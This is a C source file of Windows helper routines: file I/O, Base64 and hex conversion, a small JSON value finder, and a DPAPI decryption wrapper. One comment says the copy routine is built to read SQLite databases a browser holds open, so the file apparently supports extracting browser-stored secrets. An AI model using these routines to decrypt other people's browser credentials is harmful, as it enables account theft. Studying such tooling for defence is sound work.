#include "Common.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Local byte helpers (replace memchr/memcmp so no CRT string header is needed)

static BOOL LocalMemoryEqualA(IN LPCSTR pszA, IN LPCSTR pszB, IN DWORD cbBytes)
{
    for (DWORD i = 0; i < cbBytes; i++)
    {
        if (pszA[i] != pszB[i])
            return FALSE;
    }
    return TRUE;
}

static LPCSTR LocalFindCharA(IN LPCSTR pszStart, IN CHAR cTarget, IN DWORD cbBytes)
{
    for (DWORD i = 0; i < cbBytes; i++)
    {
        if (pszStart[i] == cTarget)
            return (pszStart + i);
    }
    return NULL;
}

static BOOL LocalIsSpaceA(IN CHAR c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\r') ? TRUE : FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// File I/O

BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize)
{
    HANDLE  hFile       = INVALID_HANDLE_VALUE;
    DWORD   dwFileSize  = 0x00,
            dwBytesRead = 0x00;
    PBYTE   pbBuffer    = NULL;
    BOOL    bResult     = FALSE;

    if (!pszFilePath || !ppFileBuffer || !pdwFileSize)
        return FALSE;

    *ppFileBuffer   = NULL;
    *pdwFileSize    = 0x00;

    if ((hFile = CreateFileA(pszFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA Failed On '%s' With Error: %lu\n", pszFilePath, GetLastError());
        return FALSE;
    }

    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE || dwFileSize == 0)
    {
        printf("[!] GetFileSize Failed On '%s' With Error: %lu\n", pszFilePath, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize + 1)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ReadFile(hFile, pbBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
    {
        printf("[!] ReadFile Failed On '%s' With Error: %lu\n", pszFilePath, GetLastError());
        goto _END_OF_FUNC;
    }

    *ppFileBuffer   = pbBuffer;
    *pdwFileSize    = dwBytesRead;
    pbBuffer        = NULL;
    bResult         = TRUE;

_END_OF_FUNC:

    if (pbBuffer)
        HeapFree(GetProcessHeap(), 0, pbBuffer);

    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);

    return bResult;
}

BOOL WriteFileToDiskA(IN LPCSTR pszFilePath, IN PBYTE pbFileBuffer, IN DWORD dwFileSize)
{
    HANDLE  hFile           = INVALID_HANDLE_VALUE;
    DWORD   dwBytesWritten  = 0x00;
    BOOL    bResult         = FALSE;

    if (!pszFilePath || !pbFileBuffer || dwFileSize == 0)
        return FALSE;

    if ((hFile = CreateFileA(pszFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA Failed On '%s' With Error: %lu\n", pszFilePath, GetLastError());
        return FALSE;
    }

    if (!WriteFile(hFile, pbFileBuffer, dwFileSize, &dwBytesWritten, NULL) || dwBytesWritten != dwFileSize)
    {
        printf("[!] WriteFile Failed On '%s' With Error: %lu\n", pszFilePath, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:

    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);

    return bResult;
}

BOOL CopyFileSharedA(IN LPCSTR pszSrcPath, IN LPCSTR pszDstPath)
{
    HANDLE  hSrc            = INVALID_HANDLE_VALUE,
            hDst            = INVALID_HANDLE_VALUE;
    PBYTE   pbBuffer        = NULL;
    DWORD   dwBytesRead     = 0x00,
            dwBytesWritten  = 0x00;
    BOOL    bResult         = FALSE;

    if (!pszSrcPath || !pszDstPath)
        return FALSE;

    // FILE_SHARE_READ|WRITE|DELETE lets us read SQLite DBs the browser currently holds open.
    if ((hSrc = CreateFileA(pszSrcPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA Failed To Open Source '%s' With Error: %lu\n", pszSrcPath, GetLastError());
        return FALSE;
    }

    if ((hDst = CreateFileA(pszDstPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileA Failed To Open Destination '%s' With Error: %lu\n", pszDstPath, GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE_65536)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    for (;;)
    {
        if (!ReadFile(hSrc, pbBuffer, BUFFER_SIZE_65536, &dwBytesRead, NULL))
        {
            printf("[!] ReadFile Failed With Error: %lu\n", GetLastError());
            goto _END_OF_FUNC;
        }

        if (dwBytesRead == 0)
            break;

        if (!WriteFile(hDst, pbBuffer, dwBytesRead, &dwBytesWritten, NULL) || dwBytesWritten != dwBytesRead)
        {
            printf("[!] WriteFile Failed With Error: %lu\n", GetLastError());
            goto _END_OF_FUNC;
        }
    }

    FlushFileBuffers(hDst);
    bResult = TRUE;

_END_OF_FUNC:

    HEAP_FREE(pbBuffer);

    if (hDst != INVALID_HANDLE_VALUE)
        CloseHandle(hDst);

    if (hSrc != INVALID_HANDLE_VALUE)
        CloseHandle(hSrc);

    return bResult;
}

BOOL FileExistsA(IN LPCSTR pszFilePath)
{
    DWORD dwAttributes = 0x00;

    if (!pszFilePath)
        return FALSE;

    if ((dwAttributes = GetFileAttributesA(pszFilePath)) == INVALID_FILE_ATTRIBUTES)
        return FALSE;

    return (dwAttributes & FILE_ATTRIBUTE_DIRECTORY) ? FALSE : TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Encoding / conversion

LPSTR BytesToHexString(IN PBYTE pbData, IN DWORD cbData)
{
    const CHAR  szHexChars[]    = "0123456789abcdef";
    LPSTR   pszHexString    = NULL;
    DWORD   cchHexString    = 0x00;

    if (!pbData || cbData == 0)
        return NULL;

    cchHexString = (cbData * 2) + 1;

    if (!(pszHexString = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cchHexString)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    for (DWORD i = 0; i < cbData; i++)
    {
        pszHexString[(i * 2) + 0] = szHexChars[(pbData[i] >> 4) & 0x0F];
        pszHexString[(i * 2) + 1] = szHexChars[(pbData[i] >> 0) & 0x0F];
    }

    return pszHexString;
}

LPSTR DuplicateAnsiStringA(IN LPCSTR pszSrc)
{
    SIZE_T  cbAlloc = 0;
    LPSTR   pszDst  = NULL;

    if (!pszSrc)
        return NULL;

    cbAlloc = ((SIZE_T)lstrlenA(pszSrc) + 1) * sizeof(CHAR);

    if (!(pszDst = (LPSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAlloc)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    lstrcpyA(pszDst, pszSrc);

    return pszDst;
}

PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
{
    PBYTE   pbOutput    = NULL;
    DWORD   dwOutput    = 0x00;

    if (!pszInput || cbInput == 0 || !pcbOutput)
        return NULL;

    *pcbOutput = 0;

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
    {
        printf("[!] CryptStringToBinaryA Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    if (!(pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOutput)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
    {
        printf("[!] CryptStringToBinaryA Failed With Error: %lu\n", GetLastError());
        HEAP_FREE(pbOutput);
        return NULL;
    }

    *pcbOutput = dwOutput;
    return pbOutput;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// JSON helpers

LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue)
{
    CHAR    szSearchKey[BUFFER_SIZE_128]    = { 0 };
    LPCSTR  pszJsonEnd                      = NULL,
            pszKeyStart                     = NULL,
            pszValueStart                   = NULL,
            pszValueEnd                     = NULL;
    DWORD   dwKey                           = 0x00,
            dwKeyLen                        = 0x00;

    if (!pszJson || !pszKey || !pcbValue)
        return NULL;

    *pcbValue   = 0;
    pszJsonEnd  = pszJson + cbJson;

    // Build "\"key\"" without CRT helpers
    dwKeyLen = (DWORD)lstrlenA(pszKey);
    if ((dwKeyLen + 2) >= BUFFER_SIZE_128)
        return NULL;

    szSearchKey[0]  = '"';
    for (DWORD i = 0; i < dwKeyLen; i++)
        szSearchKey[1 + i] = pszKey[i];
    szSearchKey[1 + dwKeyLen] = '"';

    dwKey = (DWORD)lstrlenA(szSearchKey);

    pszKeyStart = pszJson;
    while (pszKeyStart < (pszJsonEnd - dwKey))
    {
        pszKeyStart = LocalFindCharA(pszKeyStart, '"', (DWORD)(pszJsonEnd - pszKeyStart));
        if (!pszKeyStart)
            return NULL;

        if (LocalMemoryEqualA(pszKeyStart, szSearchKey, dwKey))
            break;

        pszKeyStart++;
    }

    if (!pszKeyStart || pszKeyStart >= (pszJsonEnd - dwKey))
        return NULL;

    pszKeyStart += dwKey;

    while (pszKeyStart < pszJsonEnd && LocalIsSpaceA(*pszKeyStart))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != ':')
        return NULL;

    pszKeyStart++;

    while (pszKeyStart < pszJsonEnd && LocalIsSpaceA(*pszKeyStart))
        pszKeyStart++;

    if (pszKeyStart >= pszJsonEnd || *pszKeyStart != '"')
        return NULL;

    pszValueStart = pszKeyStart + 1;

    pszValueEnd = pszValueStart;
    while (pszValueEnd < pszJsonEnd)
    {
        if (*pszValueEnd == '"' && *(pszValueEnd - 1) != '\\')
            break;

        pszValueEnd++;
    }

    if (pszValueEnd >= pszJsonEnd)
        return NULL;

    *pcbValue = (DWORD)(pszValueEnd - pszValueStart);
    return (LPSTR)pszValueStart;
}

LPSTR FindNestedJsonValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszParentKey, IN LPCSTR pszChildKey, OUT PDWORD pcbValue)
{
    CHAR    szSearch[BUFFER_SIZE_128]   = { 0 };
    LPCSTR  pszJsonEnd                  = NULL,
            pszParent                   = NULL;
    DWORD   dwSearch                    = 0x00,
            dwParentLen                 = 0x00,
            dwRemaining                 = 0x00;

    if (!pszJson || !pszParentKey || !pszChildKey || !pcbValue)
        return NULL;

    *pcbValue   = 0;
    pszJsonEnd  = pszJson + cbJson;

    dwParentLen = (DWORD)lstrlenA(pszParentKey);
    if ((dwParentLen + 2) >= BUFFER_SIZE_128)
        return NULL;

    szSearch[0] = '"';
    for (DWORD i = 0; i < dwParentLen; i++)
        szSearch[1 + i] = pszParentKey[i];
    szSearch[1 + dwParentLen] = '"';

    dwSearch    = (DWORD)lstrlenA(szSearch);
    pszParent   = pszJson;

    while (pszParent < (pszJsonEnd - dwSearch))
    {
        pszParent = LocalFindCharA(pszParent, '"', (DWORD)(pszJsonEnd - pszParent));
        if (!pszParent)
            return NULL;

        if (LocalMemoryEqualA(pszParent, szSearch, dwSearch))
            break;

        pszParent++;
    }

    if (!pszParent || pszParent >= (pszJsonEnd - dwSearch))
        return NULL;

#define MAX_NESTED_JSON_SEARCH 50000
    dwRemaining = (DWORD)(pszJsonEnd - pszParent);
    if (dwRemaining > MAX_NESTED_JSON_SEARCH)
        dwRemaining = MAX_NESTED_JSON_SEARCH;
#undef MAX_NESTED_JSON_SEARCH

    return FindJsonStringValue(pszParent, dwRemaining, pszChildKey, pcbValue);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Crypto

BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted)
{
    DATA_BLOB   blobIn      = { 0 };
    DATA_BLOB   blobOut     = { 0 };

    if (!pBlob || dwBlob == 0 || !ppDecrypted || !pcbDecrypted)
        return FALSE;

    *ppDecrypted    = NULL;
    *pcbDecrypted   = 0;

    blobIn.pbData   = pBlob;
    blobIn.cbData   = dwBlob;

    if (!CryptUnprotectData(&blobIn, NULL, NULL, NULL, NULL, 0, &blobOut))
    {
        printf("[!] CryptUnprotectData Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    *ppDecrypted    = blobOut.pbData;
    *pcbDecrypted   = blobOut.cbData;

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Paths

BOOL GetDesktopDirectoryA(OUT LPSTR pszBuffer, IN DWORD dwBufferSize)
{
    if (!pszBuffer || dwBufferSize == 0)
        return FALSE;

    if (FAILED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY | CSIDL_FLAG_CREATE, NULL, 0, pszBuffer)))
    {
        printf("[!] SHGetFolderPathA Failed To Resolve The Desktop Directory\n");
        return FALSE;
    }

    return TRUE;
}

LPCSTR PathFindFileNameLocalA(IN LPCSTR pszPath)
{
    LPCSTR pszLastSlash = pszPath;

    if (!pszPath)
        return NULL;

    while (*pszPath)
    {
        if (*pszPath == '\\' || *pszPath == '/')
            pszLastSlash = pszPath + 1;

        pszPath++;
    }

    return pszLastSlash;
}
